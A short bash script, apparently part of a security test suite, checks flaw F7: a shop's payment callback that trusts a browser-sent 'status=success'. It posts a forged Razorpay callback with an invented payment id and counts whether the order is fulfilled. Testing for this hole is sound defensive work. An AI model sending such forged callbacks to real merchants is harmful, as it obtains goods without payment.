#!/usr/bin/env bash
# shellcheck source=lib.sh
source "$(dirname "$0")/lib.sh"
# F7: the Checkout callback trusts status=success sent by the browser.
flaws F7
read -r shop gw < <(order 1000000)
code="$(curl -s -o /dev/null -w '%{http_code}' -X POST "$(callback_url "$shop")" \
  --data-urlencode "razorpay_order_id=$gw" --data-urlencode "razorpay_payment_id=pay_forged$RANDOM" --data-urlencode "status=success")"
settle
n="$(fulfilments "$shop")"
verdict F7 "$([[ $n -gt 0 ]] && echo yes || echo no)" "unsigned callback with status=success → HTTP $code, fulfilments $n"
